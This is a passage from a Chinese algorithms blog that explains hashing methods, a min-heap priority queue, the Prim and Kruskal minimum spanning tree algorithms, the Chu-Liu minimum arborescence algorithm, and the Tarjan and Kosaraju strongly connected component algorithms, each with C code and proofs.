m（因为探查序列逐个向后偏移，每个散列到前面i个满槽的元素都会一直扫描到这个空槽才会停止），因此群集现象很容易出现，连续被占用槽会越来越长，平均查找时间也会随之增加。 二次探查：采用如下形式的散列函数h( k, i ) = ( h’(k) + P×i + Q×i^2 ) mod m，这里h’是一个辅助散列函数，P和Q（不等于0）是辅助常数，i = 0，1，…，m-1。初始探查位置为T[h’（k）]，后续探查位置会在此基础上增加一个偏移量，这个偏移量以二阶形式依赖于探查号i。常数P，Q的选择影响着该方法的效率。此外，如果两个关键字k1，k2的初始探查位置相同，那么他们接下来的探查序列也是相同的，因为h（k1,0） = h（k2,0）意味着h（k1,i）=h（k2,i）。这一性质可能导致程度较轻的群集现象，称为二次群集。此方法和线性探查一样，产生的探查序列都依赖于初始探查位置，因此只有m种不同的探查序列。 双重散列：是用于开放寻址法最好的方法之一，其产生的排列具有随机选择的排列特性。采用如下形式：h( k, i ) = ( h1(k) + ih2(k) ) mod m，其中h1和h2为辅助散列函数。初始探查位置为T[h1(k)]，后续的探查位置在此基础上加上偏移量h2（k）×探查号并对m取模。与前两种方式不同的是，这里的探查序列以两种方式依赖于关键字k，因为初始探查位置和偏移量都可能发生变化。为了能查找到整个散列表，值h2（k）要和表的大小m互质。一种确保这个条件成立的方法是取m为2的幂，并设计一个总产生奇数的h2（）。另一种可行的方法是取m为质数，并设计一个总产生比m小的正整数的h2（）。例如，可以取m为一个质数，并取h1（k）=k mod m，h2（k）=1+（k mod m’）这里的m’略小于m（可取m-1）；假如这里m = 701，m’ = 700，k = 123456，那么h1（k）=80，h2（k）=257，因此第一个探查位置为80，然后每257个槽（mod m）检查一次，直到找到关键字或检查过所有的槽。这种散列方法用了Θ（m^2)种探查序列，较为接近理想的“一致散列”。 性能：在开放寻址法中，α = n / m，因为每个槽最多只能有一个元素，因此n ≤ m，因此α ≤ 1。有定理：给定一个装载因子为α = n/m &lt; 1的开放寻址散列表，假设一致散列，则在一次不成功的查找中，期望的探查数至多为1/（1-α），平均情况下插入一个元素至多需要做1/（1-α）次探查，一次成功查找中的期望探查数至多为-ln（1-α）/α。证明在算法导论242-243页。上述定理说明，散列表的α越小，期望效率越好。 散列函数 一个好的散列函数所应该近似满足简单一致散列的假设。当然一般情况下无法检测这一条件是否成立，因为无法确定关键字所属的概率分布，而关键字可能互相并不完全独立。实践中通常通过启发式技术构造好的散列函数，例如编译器的变量列表中，pt和pts相似并且经常出现，好的散列函数应该最小化将这二者映射到同一个槽中的可能性。部分应用可能会要求比简单一致更严格的性质，比如要求某些很相似的关键字具有完全不同的散列值。全域散列（unversal hasing）通常能够提供这些性质。 将关键字映射到自然数中，例如一个字符串中的每个关键字可以被解释成ascll码，标识符pt可以被解释为十进制整数对（112，116），之后按128为基数，pt即为112×128+116=14452。将关键字转换为较大的自然数更容易设计高效的散列方法。假设所有给定的关键字都是自然数。 除法散列法：h（k）= k mod m。这里m不应该是2的幂，如果m = 2^p ，则h（k）为k的低p位。m的值通常是和2的整数幂不太接近的质数。 乘法散列法：h（k）= m×（k×A mod 1）的下取整。常数A满足（ 0 &lt; A &lt; 1 ），即用m乘以kA的小数部分再取结果的底。这种方法对m的选择没有严格的要求，通常取m为2的某个幂次。某些特定的A值效果更好，最佳的A值和待散列的数据特征有关。Donald E.Knuth认为A = （ sqrt(5) - 1 ）/2 = 0.6180339887 是一个较为理想的值。可以取A为一个形如s/2^ω 的分数，并使其接近0.618。 全域散列：如果精心设计关键字使得所有关键字都全部散列到同一个槽中，那么每个特定的散列函数都可能出现这种最坏情况状态。因此唯一的改进方法是使散列函数独立于关键字，随机选取散列函数。很容易设计出一个全域散列函数类：选择一个足够大的质数p &gt; |U| &gt; m，使得每个关键字都可以落在0～p-1的范围内，则对于任意a∈{1，2，…，p-1}，b∈{0，1，…，p-1}，定义h(a,b)(k) = ( ( a × k + b ) mod p ) mod m。例如p=17，m=6，则h(3,4)(8)=5。 优先队列和二叉堆 普通队列是一种先进先出的数据结构，队尾插入，队头删除。在优先队列（priority queue）中，每个元素被赋予不同的优先级，出队时优先级最高的元最先被删除（largest-in，first-out）。优先队列适用范围很广，如构造哈夫曼编码（每次寻找到节点集合中频率最小的两个点，合并后继续循环），合并n个有序序列为一个有序序列（将n个有序序列的第一个元素取出，添加到优先队列，并且取最小值，再添加新元素，以此类推），操作系统中一些任务调度算法等。优先队列通常通过最小堆实现，因此适用于堆的应用都适用于优先队列。 完整实现 在排序和字符串匹配中给出过堆排序的实现，在Prim算法中也使用了堆优化。下面以整型元素为例给出完整的最小堆实现。 结构定义 1234typedef struct&#123; int * list; int heapsize;&#125;heap; 下标获取 123456789int Father( int u )&#123; return u / 2;&#125;int Left( int u )&#123; return 2 * u;&#125;int Right( int u )&#123; return 2 * u + 1;&#125; 自顶向下维护 123456789101112131415void heapDown( heap &amp; h, int u )&#123; while ( Left(u) &lt;= h.heapsize )&#123; int child; if ( Left(u) == h.heapsize || h.list[ Left(u) ] &lt; h.list[ Right(u) ] ) child = Left(u); else child = Right(u); if ( h.list[ child ] &lt; h.list[u] )&#123; swap( h.list, u, child ); u = child; &#125; else break; &#125;&#125; 自底向上维护 12345678910void heapUp( heap &amp; h, int u )&#123; while ( u &gt; 1 )&#123; if ( h.list[ Father(u) ] &gt; h.list[u] )&#123; swap( h.list, u, Father(u) ); u = Father(u); &#125; else break; &#125;&#125; 入队 1234void push( heap &amp; h, int w )&#123; h.list[++h.heapsize] = w ; heapUp( h, h.heapsize );&#125; 出队 123456int pop( heap &amp; h )&#123; int root = h.list[1]; swap( h.list, 1, h.heapsize-- ); heapDown( h, 1 ); return root;&#125; STL中优先队列的使用 empty()如果队列为空返回真pop()删除队列头元素push()加入元素size()返回优先队列中拥有的元素个数top()返回优先队列队头元素 头文件#include&lt;queue&gt;，声明方式（以整型数据为例）priority_queue&lt;int&gt; q; 自定义优先级 123456struct cmp&#123; operator bool()( int x, int y )&#123; return x &gt; y; // 数据小的优先级高 &#125;&#125;;priority_queue&lt;int, vector&lt;int&gt;, cmp &gt; q; 通过结构体声明比较优先级方式 1234567struct node &#123; int x, y; // y为值，x为优先级 friend bool operator&lt; ( node a, node b )&#123; 重载运算符比较优先级 return a.x &gt; b.x; //在结构体中，x更小的优先级更高 &#125;&#125;;priority_queue&lt;node&gt; q; 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/28/Data-Structure-basis2/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Data-Structures","slug":"Data-Structures","permalink":"http://forec.github.io/tags/Data-Structures/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"最小生成树和最小树形图","slug":"Graph-Algorithms4","date":"2015-09-23T01:03:27.000Z","updated":"2016-11-04T15:44:18.000Z","comments":true,"path":"2015/09/23/Graph-Algorithms4/","link":"","permalink":"http://forec.github.io/2015/09/23/Graph-Algorithms4/","excerpt":"最小生成树的算法设计，以及实现的Prim和Kruskal算法。最小树形图的朱刘算法。","text":"最小生成树的算法设计，以及实现的Prim和Kruskal算法。最小树形图的朱刘算法。 摘要 最小生成树 算法设计 Prim算法 Kruskal算法 最小树形图 朱刘算法 1986年Tarjan等提出的复杂度更好的算法 分析一下MST普适算法，加一些证明，帮助理解。 最小生成树 一个有V个顶点的无向连通图，其最小生成树是包含原图全部V个顶点，并且保持V个节点连通的，具有V-1条权值之和最小边的连通子图。（MST） 算法设计 贪心策略在求解MST时是可行的：要寻找最小生成树T，对于任意顶点u而言，在其相邻边的集合中，假设权值最小边是（u，v），而T中不包含（u，v），因此一定有另一条相邻边（u，v’）∈T且其权值大于（u，v），这意味着T不满足最小生成树的性质。根据定义，最小生成树只含有V-1条边，因此关键在于如何寻找不破坏性质而对整体而言权值相对更小的边。最小生成树包含图中所有顶点，因此从任一顶点开始搜索都可以获取到满足的MST，假设从顶点s开始，对于s紧邻的所有顶点遍历过后，一定会有一个顶点v，使得（s，v）的权值是所有s邻边中最小的，根据上面贪心策略的证明，（s，v）∈T。将构造过程中的顶点集合记为A，边集合记为E^s ，此时A = {s，v}，E^s = {（s，v）}，E^s ⊆T。 定义一些概念：无向图G =（V，E）的一个割（A，V - A）是对顶点集V的一个划分，当一条边（u，v）∈E并且其中一个顶点∈A，另一个顶点∈（V - A），称这条边（u，v）通过割（A，V - A）。如果一个边集E’满足其中任一边都不通过某个割，则说这个割不妨害边集E’。如果某一条边的权值是通过一个割的所有边中最小的，则称该边为通过这个割的一条轻边（可能会有多条轻边）。 接下来对E^s 继续扩充。显然，再向E^s 中加入任何直接或间接连接s，v的边都是无用的，称这些边为对E^s 不安全的边。可以添加的安全边必须满足一定条件，下面寻找这个条件。上一句已经表明：安全边首先必须通过割（A，V - A），否则是不安全的。根据贪心策略，应当在通过割的边中寻找最小边，因此定义里的轻边是符合这两个前提的。下面证明，通过割（A，V - A）的轻边是对E^s 安全的（显然，割（A，V - A）是不妨害E^s 的）： 假设T是包含E^s 的一棵最小生成树，并且T不包含轻边（u，v）（否则证明完成）。因为T不包含（u，v），所以向T中加入（u，v）将构成回路。因为（u，v）通过割（A，V - A），所以在T中存在另外一条边也通过割，假设这条边是（x，y），因为割不妨害E^s ，所以（x，y）不属于E^s 。在T中，除去任意一条边都会导致生成树变成两个子图，如果去掉（x，y），T将被分成两个子图（u到v的唯一通路断开），此时加入边（u，v）将使得T重新被连接，新的T’ = T - {（x，y）}∪{（u，v）}。接下来可以证明T’是一颗最小生成树。记ω（a，b）为边（a，b）的权值，因为（u，v）是轻边，所以ω（u，v）≤ ω（x，y），所以ω（T’）≤ ω（T）。又已知T是最小生成树，所以ω（T）≤ ω（T’）。因此T’是最小生成树。 下面证明（u，v）是E^s 的一条安全边。因为E^s ⊆T而（x，y）∉E^s ，故E^s ⊆T’。故E^s ∪{（u，v）}⊆T’。因为T’是最小生成树，所以（u，v）对E^s 是安全的。 整个流程。根据上面的证明，已经确定了加边的过程和依据。1234567Get-MST( G, ω )&#123; E^s ← ∅ while E^s hasn't formed a MST find a safe edge (u, v) for E^s E^s ← E^s ∪&#123;（u，v）&#125; return E^s&#125; Prim算法 Prim算法又称为DJP算法，分别于1930年由捷克数学家沃伊捷赫·亚尔尼克（Vojtěch Jarník），1957年由美国计算机科学家罗伯特·普里姆（Robert C. Prim），1959年由艾兹格·迪科斯彻多次发现。下面的链接是Wiki上关于普里姆算法的描述。 算法描述 输入一个加权连通图G =（V，E）。 初始化一个顶点集Vn = {s}，s是集合V中的任一节点作为起点，边集En = {}为空。 重复下列操作直到V = Vn： 从集合E中选取（u，v），满足以下条件：u属于Vn且v不属于Vn，并且这样的（u，v）在E中权值最小，如果存在多条相同权值的边，任选其一。 将v加入Vn中，将边（u，v）边加入En中。 En为最小生成树包含的V-1条边的集合。 时间复杂度分析 邻接矩阵表示:采用邻接矩阵存储，每次寻找到权值最短的边需要O（V），一共需要O（V^2）。 采用邻接表+二叉堆，O（（V+E）logV）。因为对维护边的二叉堆每次操作需要logV，需要调整边E次，向En加边后删除最小元V次。 采用斐波那契堆+邻接表为O（E+VlogV），在连通图足够稠密时（E = Ω（VlogV）时），可以显著提高运行速度。 代码实现(邻接表+堆优化）123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#define INF 0x7fffffffstruct edge&#123; int v, w, next;&#125;* edges;int *h, *heap, *pos, *dist;/* dist used to store the distance between Vn and V - Vn h[i] points to the position of first v satisfying (u,v) heap[] simulates a heap structure to store vertexs pos[u] counts the position of vertex u in heap[]*/ int V, E, size, count;void insert( int u, int v, int w )&#123; edges[++count].v = v; edges[count].w = w; edges[count].next = h[u]; h[u] = count;&#125;void swap( int * a , int * b )&#123; int temp = *a; *a = *b; *b = temp;&#125;int Father( int u )&#123; return u / 2;&#125;int Left( int u )&#123; return 2 * u;&#125;int Right( int u )&#123; return 2 * u + 1;&#125;void heapUp( int u )&#123; while ( u &gt; 1 )&#123; if ( dist[ heap[ Father(u) ] ] &gt; dist[ heap[u] ] )&#123; swap( pos + heap[ Father(u) ] , pos + heap[u] ); swap( heap + Father(u) , heap + u ); u = Father(u); &#125; else break; &#125;&#125;void heapDown( int u )&#123; while ( Left(u) &lt;= size )&#123; int child; if ( Left(u) == size || dist[ heap[ Left(u) ] ] &lt; dist[ heap[ Right(u) ] ] ) child = Left(u); else child = Right(u); if ( dist[ heap[u] ] &gt; dist[ heap[child] ] )&#123; swap( pos + heap[u], pos + heap[child] ); swap( heap + u, heap + child ); u = child; &#125; else break; &#125;&#125;void push( int v, int w )&#123; dist[v] = w; heap[ ++size ] = v; pos[v] = size; heapUp(size);&#125;int pop()&#123; int root = heap[1]; swap( pos + heap[size], pos + heap[1]); swap( heap + (size--), heap + 1 ); heapDown(1); return root;&#125;void init()&#123; int i, u, v, w; scanf( \"%d %d\", &amp;V, &amp;E ); h = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); heap = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); pos = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); dist = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); memset( h, 0, sizeof(int) * ( V + 1 ) ); memset( heap, 0, sizeof(int) * ( V + 1 ) ); memset( pos, 0, sizeof(int) * ( V + 1 ) ); memset( dist, 0, sizeof(int) * ( V + 1 ) ); edges = ( struct edge * )malloc( sizeof( struct edge ) * ( 2 * ( E + 2) ) ); for ( i = 1 ; i &lt;= E ; i++ )&#123; scanf( \"%d %d %d\", &amp;u, &amp;v, &amp;w ); insert( u, v, w ); insert( v, u, w ); &#125; push( 1, 0 ); for ( i = 2 ; i &lt;= V ; i++ ) push( i, INF );&#125;int prim()&#123; int i, v, ans = 0; for ( i = 1 ; i &lt;= V ; i++ )&#123; int front = pop(); ans += dist[front]; pos[front] = -1; for ( v = h[front] ; v != 0 ; v = edges[v].next )&#123; int destination = edges[v].v; if ( pos[destination] != -1 &amp;&amp; dist[destination] &gt; edges[v].w )&#123; dist[destination] = edges[v].w; heapUp( pos[destination] ); heapDown( pos[destination] ); &#125; &#125; &#125; return ans;&#125;int main()&#123; init(); printf( \"%d\\n\", prim() ); return 0;&#125; 代码给出最小生成树的权值和。如果需要记录E^s ，要额外建立一个数组e，在每次修改dist的时候维护e，或者在edge结构中加入一个flag域区分此边是否被选中，每次维护dist都要更新对应边的flag域。运行示例： Kruskal算法 可以看出要优化Prim需要比较高的代码复杂度。Kruskal算法从E中选取V-1条边，其贪心策略简单并且易实现，完全基于上面算法设计的描述，只需要对边进行操作，并用并查集判断点之间的相交关系。采用快速排序的Kruskal时间复杂度为O（ElogE），适合稀疏图。如果不采用快速排序，改用优先队列维护Kruskal效率会更高（如果边比较多，会有很多无用边无需排序，只要取出优先队列前列的需要的MST边）。与Prim的区别在于：Kruskal中，E^s 是一个森林，加入集合E^s 的安全边总是连接G中的两个不同连通分支的最小权边；而在Prim中，E^s 一直只有一棵树，每次向E^s 中添加的安全边连接E^s 和一个不在树中的顶点的最小权边。 算法描述 对于无向连通图G =（V，E），先构造一个只含V个顶点，边集为空的子图G’，若将G’中各个顶点看成是各棵树上的根结点，则它是一个含有V棵树的一个森林。从E中选取一条权值最小的边，若该条边的两个顶点分属不同的树，则将其加入G’，即将这两个顶点分别所在的两棵树合成一棵树；反之若该条边的两个顶点已落在同一棵树上，则跳过，取下一条权值最小的边再尝试。直至森林中只有一棵树，即G’中含有V-1条边。 代码实现（快速排序+并查集，边集数组存储）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include &lt;stdio.h&gt;#include &lt;memory.h&gt;#include &lt;stdlib.h&gt;typedef struct Edge&#123; int u, v, w;&#125;edge;int V, E;int * f, * r; // r[u] is the depth of the tree with the root u edge * edges;int cmp( const void * a, const void * b )&#123; return ( (edge * ) a)-&gt;w - ( (edge *) b)-&gt;w;&#125;int getFather( int x )&#123; if ( f[x] != x ) f[x] = getFather( f[x] ); return f[x];&#125;int isSame( int x, int y )&#123; return getFather( x ) == getFather( y );&#125;int setUnion( int x,int y )&#123; int fx, fy; if ( ( fx = getFather(x) ) == ( fy = getFather(y) ) ) return 1; if ( r[fx] &gt; r[fy] ) f[fy] = fx; else &#123; f[fx] = fy; if ( r[fx] == r[fy] ) r[fy]++; &#125; return 0;&#125;void init()&#123; scanf( \"%d %d\", &amp;V, &amp;E ); int i; edges = ( edge * ) malloc ( sizeof( edge ) * E ); f = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); r = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); memset( r, 0, sizeof( int ) * ( V + 1 ) ); for ( i = 0 ; i &lt; E ; i++ ) scanf( \"%d %d %d\", &amp;edges[i].u, &amp;edges[i].v, &amp;edges[i].w ); qsort( edges, E, sizeof( edge ), cmp ); for ( i = 1 ; i &lt;= V ; i++ ) f[i] = i;&#125;int Kruskal()&#123; int i, e = 0, ans = 0; for ( i = 0 ; i &lt; E &amp;&amp; e &lt; V - 1 ; i++ ) if ( !isSame( edges[i].u, edges[i].v ) )&#123; e++; ans += edges[i].w; setUnion( edges[i].u, edges[i].v ); &#125; if ( e != V - 1 ) return -1; return ans;&#125;int main()&#123; init(); printf( \"%d\\n\", Kruskal() ); return 0;&#125; 最小树形图 上面的最小生成树针对无向加权连通图，在有向带权图中，指定一个特定的顶点root，求出一棵以root为根的有向生成树T，使得T中所有边的总权值最小，该问题称为最小树形图。以下均不考虑图中不存在最小树形图的情况（判断是否存在只要对图进行一次遍历即可确定）。 朱刘算法 朱刘算法是最小树形图的第一个算法，在1965年由朱永津和刘振宏提出，复杂度为O（VE）。 算法描述 对固定根root进行一遍DFS判断是否存在最小树形图。 为除了root之外的每个顶点选定一条最小的入边（用pre[u]记录顶点u最小入边的起点）。 判断2中构造的入边集合是否存在有向环，如果不存在，那么这个集合就是该图的最小树形图。 如果3中判断出现有向环，则消环缩点。设（u, v, w）表示从u到v的权为w的边。假设3中判断出的有向环缩为新顶点new，若u位于环上，并设环中指向u的边权是ω[u]。那么对于每条从u出发的边（u, v, w），在新图中连接（new, v, w），对于每条进入u的边（in, u, w），在新图中建立边（in, new, w-ω[u]）。新图里最小树形图的权加上旧图中被收缩的环的权和，就是原图中最小树形图的权值。重复2，3，4。 3中判断无有向环，返回权值。 其他： 如果没有指定固定根，可以增加一个虚拟根，并且为其增加V条边指向每个顶点，权值都为原图所有边权值之和加一，转化为固定根求解。 朱流算法只能求解最小总权值，无法求出路径（缩点后原顶点编号改变）。 代码描述（边集数组）12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#define INF 0x7fffffffint V, E;typedef struct Edge&#123; int u, v, w;&#125;edge;int * in, * num, * pre, * father;edge * edges;void init()&#123; int i; scanf( \"%d %d\", &amp;V, &amp;E ); num = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); in = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); pre = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); father = ( int * ) malloc ( sizeof( int ) * ( V + 1 ) ); edges = ( edge * ) malloc ( sizeof( edge ) * E ); for ( i = 0 ; i &lt; E ; i++ ) scanf( \"%d %d %d\", &amp;edges[i].u , &amp;edges[i].v, &amp;edges[i].w );&#125;int Unidirectional_MST( int root )&#123; int ans = 0; int i, u, v; while ( 1 )&#123; for ( i = 1 ; i &lt;= V ; i++ ) in[i] = INF; for ( i = 0 ; i &lt; E ; i++ )&#123; // 寻找最短边 u = edges[i].u; v = edges[i].v; if ( edges[i].w &lt; in[v] &amp;&amp; u != v )&#123; in[v] = edges[i].w; pre[v] = u; &#125; &#125; for ( i = 1 ; i &lt;= V ; i++ ) // 判断有无孤立点 if ( in[i] == INF &amp;&amp; i != root ) return 0; int count = 1; memset( num, 0, sizeof( int ) * ( V + 1 ) ); memset( father, 0, sizeof( int ) * ( V + 1 ) ); in[root] = 0; for ( i = 1 ; i &lt;= V ; i++ )&#123; ans += in[i]; v = i; while ( father[v] != i &amp;&amp; num[v] == 0 &amp;&amp; v != root )&#123; // 寻找环 father[v] = i; v = pre[v]; &#125; if ( v != root &amp;&amp; num[v] == 0 )&#123; // 缩点 for ( u = pre[v] ; u != v ; u = pre[u] ) num[u] = count; num[v] = count++; &#125; &#125; if ( count == 1 ) break; for ( i = 1 ; i &lt;= V ; i++ ) // 顶点重编号 if ( num[i] == 0 ) num[i] = count++; for ( i = 0 ; i &lt; E ; i++ )&#123; // 维护与环相连的边 v = edges[i].v; edges[i].u = num[edges[i].u]; edges[i].v = num[edges[i].v]; if ( edges[i].u != edges[i].v ) edges[i].w -= in[v]; &#125; V = count - 1; // 更新当前顶点数量和新根 root = num[root]; &#125; return ans;&#125;int main()&#123; init(); printf( \"%d\\n\", Unidirectional_MST(1) ); return 0;&#125; 流程展示 盗了一张图，演示最小树形图的构造流程，并以此为样例试运行上面的代码。 运行结果如下： 1986年Tarjan等提出的复杂度更好的算法 1986年， Gabow, Galil, Spencer和Tarjan提出了一个复杂度更好的实现，其时间复杂度为O(E+VlogV)。相关资料比较少，以后会把这里补上。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/09/23/Graph-Algorithms4/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"强连通分量","slug":"Graph-Algorithms3","date":"2015-09-19T08:08:13.000Z","updated":"2016-11-04T15:43:34.000Z","comments":true,"path":"2015/09/19/Graph-Algorithms3/","link":"","permalink":"http://forec.github.io/2015/09/19/Graph-Algorithms3/","excerpt":"求强连通分量的Tarjan算法和Kosaraju算法。","text":"求强连通分量的Tarjan算法和Kosaraju算法。 摘要 求强连通分量的Tarjan算法 Kosaraju算法 求强连通分量的Tarjan算法 几年前搞NOIP的时候就已经有很多漂亮的blog介绍tarjan算法，其中byvoid的那篇非常简洁明了，并且给出了C语言的代码，但是大部分blog都没有对tarjan中的一些技巧给出详细的证明。ccf这两年正在推广的一个软件能力认证，上周第五次测试的题目里就有tarjan的模板题。现在重写一下tarjan，对一些地方给出证明。我个人认为多数blog里对Tarjan过程的图片展示适得其反，因此这里不会通过图片演示算法流程。关于强连通分量等的概念，在前面两篇： 图的概念和术语，边的分类。 算法描述 Tarjan算法以DFS为基础，Tarjan生成的每棵深度优先树都是一个强连通子图，注意是强连通子图而非强连通分量，在byvoid的blog里并没有对这两个概念进行区分，但其所提供的代码可以得到所有的强连通子图，只需要分别计算一下图中顶点数目即可。因为对每个顶点Tarjan一次，并且需要遍历每条边，整个时间复杂度为O（V+E）。 下面是详细过程： 定义一个Stack，在遍历整棵树的时侯储存节点。 定义DFN[u]为顶点u的时间戳（在深度优先搜索中使用的数组d[u]和这里的dfn[u]是一个数组，都记录第一次访问顶点u时的时间），定义LOW[u]为u或u的子树能够向前追溯到的最早的栈中顶点的时间。如果不明白LOW数组记录的是什么，对照代码和后面的证明就可以理解。 按照DFS_Visit(u)的方式访问，不同的是每次对u的邻接顶点v访问时（即有一条有向边（u，v）），根据v的状态的不同予以区分。在深度优先搜索中，我们用白，灰和黑三种颜色表示顶点的不同状态，其中白色表示第一次访问，灰色表示已经访问但可能还有邻接顶点是白色，黑色表示该顶点所有的邻接顶点都是非白色的。在Tarjan中，对u的每个邻接顶点v，如果v是白色的（未访问过），则先对v用Tarjan，直到以v为根的子树访问完成后，返回顶点u，此时需要更新顶点u的LOW值：Low[u] = min( Low[u], Low[v] )，这根据定义（LOW[u]为u或u的子树能够向前追溯到的最早的栈中顶点的时间）就可以看懂：因为v是第一次被访问，所以v在u的子树中，Low[v]如果小于Low[u]，则说明以v为根的子树可以追溯到更早的栈中顶点，因此u或u的子树能够向前追溯的最早栈中顶点的时间就需要更新。 如果3中的v是灰色的，说明顶点v此刻正在栈中。在边的分类中，我写过反向边的辨别方法，即对于有向边（u，v），如果第一次访问这条边时，v是灰色，则（u，v）是一条反向边。此时需要更新Low[u]的值：Low[u] = min( Low[u], DFN[v] )。由定义知，DFN[v]记录的是第一次访问到顶点v的时间，因为（u，v）是反向边，因此u是v子树中的一个顶点，又因为v在栈中，因此v是u可以回溯到的某个栈中顶点，如果顶点v的时间戳早于之前记录的low[u]，就可以更新low[u]的值。 如果3中的v是黑色的（正向边或者交叉边），不需要操作，因为正向边意味着v在此前已经被访问过，并且遍历过所有以与之可到达的顶点为根的子树，其low值无法更改，而交叉边意味着v和u不属于同一个强连通子图。 与u相邻的所有顶点遍历过后，判断u是否是一个构成强连通子图的优先搜索树的根：判断条件是if ( low[u] == dfn[u] )。首先根据定义，dfn[u]一定不会小于low[u]，因为顶点u至少可以构成一个只含有u一个顶点的优先搜索树，也就是回溯到自身。如果可以回溯到栈中更早的顶点，就会有dfn[u] &gt; low[u]。当dfn[u] = low[u]时，顶点u就是某个强连通子图的根：当dfn[u]和low[u]相等，意味着u所能够向上寻找的顶点是其自身，而这时从栈顶到u的所有元素都是以u为根的子树的顶点，所以栈中u以上的顶点都可以通过u直接或间接到达，而栈中u以上的顶点的low值都为u，也就意味着他们都可以直接或间接回溯到顶点u。因此从栈顶到u的所有元素可以弹出，这些元素组成一个强连通子图。 通过上面过程可以看出，当有环时，整个环上的顶点的low值是统一的（根的low值），即这些相同low值的顶点属于同一个强连通子图。在弹栈的过程中记录每个强连通子图中顶点个数，就可以得到强连通分量。 代码 邻接表（C语言） 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#define WHITE 0#define GRAY 1#define BLACK 2struct Node &#123; int v; struct Node * next;&#125;;typedef struct Node node;int min( int x,int y )&#123; return x &lt; y ? x : y;&#125;void insert( node ** graph, int u, int v )&#123; node * temp = ( node * )malloc( sizeof( node ) ); temp-&gt;v = v; temp-&gt;next = graph[u]; graph[u] = temp;&#125;int V, E, time;int * dfn, * low, * vis;int * S, top;void Tarjan( node ** graph, int u )&#123; dfn[u] = low[u] = ++time; S[top++] = u; vis[u] = GRAY; node * temp = graph[u]; while ( temp != NULL )&#123; if ( vis[temp-&gt;v] == WHITE )&#123; Tarjan( graph, temp-&gt;v ); low[u] = min( low[u], low[temp-&gt;v] ); &#125; if ( vis[temp-&gt;v] == GRAY ) low[u] = min( low[u], dfn[temp-&gt;v] ); temp = temp-&gt;next; &#125; vis[u] = BLACK; if ( dfn[u] == low[u] )&#123; while ( S[--top] != u ) printf(\"%d \", S[top] ); printf( \"%d\\n\", u ); &#125;&#125;void Tarjan_Graph( node ** graph )&#123; dfn = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); low = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); vis = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); S = ( int * )malloc( sizeof( int ) * ( V + 1 ) ); memset( vis, 0, sizeof( int ) * ( V + 1 ) ); int i; for ( i = 1 ; i &lt;= V ; i++ ) if ( vis[i] == WHITE ) Tarjan( graph, i );&#125;int main()&#123; int i, u, v; scanf( \"%d %d\", &amp;V, &amp;E ); node ** graph = ( node ** )malloc( sizeof( node * ) * ( V + 1 ) ); for ( i = 1; i &lt;= V ; i++ ) graph[i] = NULL; for ( i = 0 ; i &lt; E ; i++ )&#123; scanf( \"%d %d\", &amp;u, &amp;v ); insert( graph, u, v ); &#125; Tarjan_Graph( graph ); return 0;&#125; 运行结果 Kosaraju算法 Kosaraju算法比Tarjan更容易理解，完全基于DFS，时间复杂度也是O（V+E）。算法导论中介绍的求强连通分量的算法就是Kosaraju。 算法描述 Kosaraju通过对原图和原图的转置（有向边（u，v）全部替换为有向边（v，u））分别进行有序的DFS获取强连通子图。这里摘录一段Wiki关于Kosaraju的描述： Let G be a directed graph and S be an empty stack. While S does not contain all vertices: Choose an arbitrary vertex v not in S. Perform a depth-first search starting at v. Each time that depth-first search finishes expanding a vertex u, push u onto S. Reverse the directions of all arcs to obtain the transpose graph. While S is nonempty: Pop the top vertex v from S. Perform a depth-first search starting at v. The set of visited vertices will give the strongly connected component containing v; record this and remove all these vertices from the graph G and the stack S. Equivalently, breadth-first search (BFS) can be used instead of depth-first search. 从上面的描述中第2步可以看出，对原图第一次DFS过程和对dag求拓扑序列的过程一致，得到的S栈看起来存放的就是拓扑序列。不过这里的图不是dag，而拓扑排序必须应用于dag。因为图中存在反向边，S中的序列就不一定满足拓扑排序中的偏序。这些反向边是构成强连通子图的关键，因此Kosaraju通过对图的转置进行DFS来突出这些反向边。原图转置（第3步）后，原本的反向边全部成为了正向边。对转置后的图按上述“不严格的拓扑序列”逆序（因为存储结构是栈，弹栈的过程产生的是不严格拓扑序列的逆序）DFS（第4步），这时的每棵深度优先树就是一个强连通子图。 证明1：要证明对原图的转置按“不严格的拓扑序列”进行DFS得到的深度优先树是强连通子图，只需要证明这棵树中任意两个顶点都是强连通的，对于Kosaraju算法而言，就是证明在原图的转置中，如果按照不严格拓扑序列DFS（u）可以访问到v，那么u和v是强连通的。 